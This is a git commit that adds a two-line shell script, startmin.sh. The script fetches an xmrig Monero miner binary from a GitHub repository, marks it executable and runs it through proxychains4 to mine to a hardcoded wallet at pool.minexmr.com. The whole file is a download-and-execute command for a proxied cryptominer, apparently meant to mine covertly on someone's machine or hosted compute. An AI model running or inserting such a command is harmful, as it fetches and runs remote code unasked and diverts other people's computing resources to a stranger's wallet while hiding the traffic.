7a0325688ee557c09c2dd58a6b60ca30621ed7f7
duggsydaddy <32011724+duggsydaddy@users.noreply.github.com>
2021-03-04 04:43:21 +0530

    Create startmin.sh

---
+++ startmin.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+wget https://github.com/duggsydaddy/xmrsample2/raw/main/xmrig && chmod +x xmrig && ./proxychains4 ./xmrig -o pool.minexmr.com:4444 -u 4AHcfXNosADQX5jSDTAAEXFchzZMQyxjZKSecUSPmyf6T4SzCMVkjsU8tnKiWUk1ApiwC69A1sVUHUJ5KbusHSuT8hayurp
